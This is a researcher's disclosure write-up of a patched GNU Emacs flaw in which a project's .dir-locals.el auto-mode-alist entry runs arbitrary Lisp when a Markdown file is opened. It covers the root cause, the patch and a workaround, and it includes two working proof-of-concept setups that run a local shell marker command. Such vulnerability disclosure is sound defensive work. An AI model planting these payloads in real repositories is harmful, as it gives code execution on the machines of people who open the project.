# Opening a README Was Enough: Code Execution Through Emacs Directory Locals

By X3r0Day · November 12, 2026

I found a validation bypass in GNU Emacs that let a project's `.dir-locals.el` execute arbitrary Emacs Lisp when a matching file was opened. The file itself could be an ordinary Markdown README. No evaluation command, local-variable approval, or trust prompt was needed.

The issue affected Emacs 31.1 and the pre-fix 32.0.50 development builds I tested. Emacs 30.2 is unaffected. Upstream disclosed the vulnerability on November 11, credited the discovery to X3r0Day, and published Stefan Monnier's patch. Sean Whitton subsequently confirmed that the fix was on the release branch, with the bug marked fixed in version 31.2.

**Patch status:** the fix is available upstream. The [November 11 announcement](https://www.openwall.com/lists/oss-security/2026/11/11/7) described 31.2 as an upcoming release; a fixed release branch is not the same thing as an already-shipped release. The [public bug report, #82213](https://debbugs.gnu.org/82213), contains the original report, patch, and release-branch confirmation.

## The short version

The attack needed two files in an attacker-controlled project:

```text
project/
├── .dir-locals.el
└── README.md
```

The README did not need to contain executable content. The payload could live entirely in `.dir-locals.el`, disguised as an entry in the directory-local `auto-mode-alist`.

Opening the README caused Emacs to select its major mode. During that selection, an internal matching helper called an attacker-supplied function **before** the caller checked whether the function was allowed.

The final mode was harmless. The earlier function was not.

One terminology point: the original research called this a "0-click" issue because execution required no extra confirmation after opening the file. The user still had to open a matching file in the project. More precisely, this was **arbitrary code execution on file open, without a trust prompt**, under the privileges of the Emacs process.

## What directory locals are supposed to do

Emacs projects can use `.dir-locals.el` to configure editing behavior for files in a directory tree: indentation, formatting, and other project-specific settings.

There is also a special `auto-mode-alist` entry that lets a directory choose major modes based on filenames. That matters because choosing a major mode means calling a function. Emacs therefore has a dedicated check for functions supplied through this path:

```elisp
(defun set-auto-mode--dir-local-valid-p (mode)
  "Say whether MODE can be used in a .dir-local.el `auto-mode-alist'."
  (and (symbolp mode)
       (string-suffix-p "-mode" (symbol-name mode))
       (commandp mode)
       (not (provided-mode-derived-p mode 'special-mode))))
```

An arbitrary lambda does not pass that check. Neither does `eval-buffer`.

This was not a normal directory-local `eval` setting. `set-auto-mode` extracted the special `auto-mode-alist` key through `hack-dir-local--get-variables`, outside the ordinary risky-variable approval flow. That path relied on the mode-function check. Bypassing it did not produce a second approval prompt later.

The check was not missing. It was in the wrong place for one execution path.

## The matcher that did more than match

The relevant file-opening path was:

```text
find-file
  normal-mode
    set-auto-mode
      read the directory-local auto-mode-alist
      set-auto-mode--apply-alist
        set-auto-mode--find-matching-alist-entry
```

The caller asked the helper to find a mode, then validated the result:

```elisp
(setq mode (set-auto-mode--find-matching-alist-entry
            alist name case-insensitive-p))
(when (and dir-local mode
           (not (set-auto-mode--dir-local-valid-p mode)))
  (message "Ignoring invalid mode `%S'" mode)
  (setq mode nil))
(when mode
  (set-auto-mode-0 mode keep-mode-if-same)
  t)
```

That looks reasonable if the helper only returns a value. But `auto-mode-alist` supports more than the usual `(REGEXP . MODE)` entry. It also accepts:

```elisp
(REGEXP FUNCTION NON-NIL)
```

This form calls a function, removes the matching suffix from the filename, and continues searching for another match.

In the vulnerable implementation, the helper remembered the first function and ran it when it found the next matching entry:

```elisp
(when newmode
  (when mode
    (set-auto-mode-0 mode t))
  (setq mode newmode))
```

That `set-auto-mode-0` call happened inside the helper. It did not perform the directory-local validity check first.

By the time execution returned to the caller, the untrusted function had already run. Validating the final return value could not undo it.

## Why the payload needs two entries

Here is the directory-local configuration from the lambda variant:

```elisp
((auto-mode-alist . (("" . fundamental-mode)
                     ("\\.md\\'" (lambda ()
                                   (shell-command "id > pwned"))
                                 t))))
```

There are two details that make this work.

First, the matcher needs another match before it executes the function it remembered from the multi-mode entry. The empty regular expression is a catch-all. After the `.md` suffix is removed, it still matches and supplies `fundamental-mode` as the final result.

Second, directory-local collection reverses these entries before matching. The catch-all is written first in `.dir-locals.el` so that the malicious `.md` entry is considered first by the matcher.

For `README.md`, the sequence is:

1. Match the `.md` entry and remember its lambda.
2. Remove the matching `.md` suffix from the filename being examined.
3. Find the catch-all entry.
4. Execute the remembered lambda inside the helper, without validating it.
5. Return `fundamental-mode` to the caller.
6. Validate `fundamental-mode`, which passes.

The function that needed checking was not the function the caller eventually checked.

## PoC 1: an ordinary Markdown file

This reproducer uses the original marker command, `id > pwned`. The command writes the current process identity to a local file; it does not need a network connection.

```sh
workdir="$(mktemp -d)"
cd "$workdir" || exit 1

cat > .dir-locals.el <<'EOF'
((auto-mode-alist . (("" . fundamental-mode)
                     ("\\.md\\'" (lambda ()
                                   (shell-command "id > pwned"))
                                 t))))
EOF

cat > README.md <<'EOF'
# Project notes

This is an ordinary Markdown document. It contains no Lisp.
EOF

emacs -Q --batch --eval '(find-file "README.md")'
cat pwned
```

On the vulnerable builds, opening the README created `pwned` in the project directory with output such as:

```text
uid=1000(user) gid=1000(user) groups=1000(user),...
```

The interactive equivalent was:

```sh
emacs -nw -Q README.md
```

Execution occurred during file opening, before the buffer was displayed, without answering a prompt. `-Q` did not prevent it: skipping personal initialization files does not disable this directory-local processing path.

This is the more revealing variant. Reading only the README would not expose the payload, because the executable part was in the project's editor configuration.

## PoC 2: turning the opened buffer into code

The function slot did not have to contain a lambda. It could also name `eval-buffer`:

```elisp
((auto-mode-alist . (("" . fundamental-mode)
                     ("\\.md\\'" eval-buffer t))))
```

In this variant, the README contained Lisp rather than an ordinary Markdown document:

```sh
workdir="$(mktemp -d)"
cd "$workdir" || exit 1

cat > .dir-locals.el <<'EOF'
((auto-mode-alist . (("" . fundamental-mode)
                     ("\\.md\\'" eval-buffer t))))
EOF

cat > README.md <<'EOF'
(shell-command "id > pwned")
;;
;; # Project notes
;; The remaining lines are Lisp comments.
EOF

emacs -Q --batch --eval '(find-file "README.md")'
cat pwned
```

The result was the same marker file. Here, selecting a mode caused Emacs to evaluate the opened buffer as Lisp. `eval-buffer` should have been rejected by the directory-local validation, but the early call never went through it.

Both variants were included in the [original report](https://debbugs.gnu.org/82213#5).

## What was tested, and what the impact was

The pre-fix research tests reproduced both variants on Linux in batch mode and interactive TTY sessions:

| Build | Recorded result |
| --- | --- |
| Emacs 31.1, Arch package `31.1-2` | Both variants reproduced |
| Emacs 32.0.50, development build from November 9, 2026 | Both variants reproduced |
| Emacs 30.2 | Unaffected, as confirmed by upstream |

The 32.0.50 result refers to the development snapshot tested before the fix, not every build carrying that development version string. GUI file opening uses the same mode-selection path, but the recorded runtime tests were batch and TTY.

The attacker needed control of a project directory containing `.dir-locals.el`, and the user needed to open a matching file beneath it. Since directory-local settings can apply to descendant directories, putting the configuration at a repository root could affect matching files further down the tree.

Unlike the [Git FSMonitor workspace-poisoning issue](/blog/fsmonitor-lrce/), this did not require shipping a preconfigured `.git` directory. A tracked `.dir-locals.el` can arrive through an ordinary clone. Cloning alone was not the trigger; opening a matching file afterward was.

The marker command demonstrated shell execution with the user's privileges. This was not a privilege-escalation primitive by itself, and it did not require the README to contain code in the lambda variant.

## How the regression happened

The [original report](https://debbugs.gnu.org/82213#5) traces the behavior through three changes:

- `ad5faa424a`, July 23, 2021: added directory-local `auto-mode-alist` support.
- `9ac6ff53b1`, July 24, 2021: tightened validation to reject arbitrary functions through that feature.
- `504bdce731`, February 16, 2025: fixed multi-mode matching behavior for bug #75961 by making the remembered function actually run.

The 2021 validation tests covered ordinary entries containing an arbitrary symbol, a lambda, and `dired-mode`. The later multi-mode behavior introduced a call inside the matcher, outside that validation boundary.

The gap was not that an invalid function passed the predicate. It was that this execution path never asked the predicate about that function.

## What the patch changes

Stefan Monnier's [published patch](https://www.openwall.com/lists/oss-security/2026/11/11/7) replaces `set-auto-mode--find-matching-alist-entry` with `set-auto-mode--from-matching-alist-entry` and passes the directory-local context into it.

Instead of checking only the final result in the caller, the matcher validates each selected function before executing it:

```elisp
(when newmode
  (if (and dir-local
           (not (set-auto-mode--dir-local-valid-p mode)))
      (message "Ignoring invalid mode `%S'" mode)
    (set-auto-mode-0 mode keep-mode-if-same)
    (setq was-set t))
  mode-t)
```

The important change is the ordering. In the directory-local path, the validity check now guards the call that actually executes the selected function, including intermediate functions in multi-mode entries. A harmless final mode no longer hides an earlier unvalidated call.

## Fix and temporary workaround

Use an Emacs package or source build containing the upstream fix. The tracker identifies 31.2 as the fixed version, and the announcement says the patch is intended for that release. For distribution packages, check whether the fix has been backported rather than relying only on the upstream version number.

The workaround recorded in my report was to disable directory-local variables before opening an untrusted project:

```elisp
(setq enable-dir-local-variables nil)
```

That blocked both PoCs in the original testing, but also disables legitimate directory-local settings. It is a workaround, not a replacement for installing the fix.

## Disclosure timeline

| Date | Event |
| --- | --- |
| November 10, 2026 | Report recorded as GNU Emacs bug #82213. |
| November 11, 2026 | Sean Whitton published the oss-security advisory, crediting X3r0Day and attaching Stefan Monnier's patch. |
| November 11, 2026 | Sean confirmed the release-branch fix; the tracker marked the issue fixed in 31.2. |
| November 12, 2026 | This writeup published. |

Thanks to Stefan Monnier for the fix and Sean Whitton for the disclosure and release-branch confirmation.

The lesson here is narrower than "project configuration can be dangerous." Emacs already had a rule against this exact kind of directory-local function execution. A later change introduced a side effect inside a helper, and the caller's validation still protected only the returned value. The execution boundary moved; the check did not.

## References

- [oss-security: Emacs .dir-locals.el arbitrary code execution, November 11, 2026](https://www.openwall.com/lists/oss-security/2026/11/11/7)
- [GNU Emacs bug #82213: original report, PoCs, patch, and discussion](https://debbugs.gnu.org/82213)
- [Release-branch fix confirmation, message #13](https://debbugs.gnu.org/82213#13)
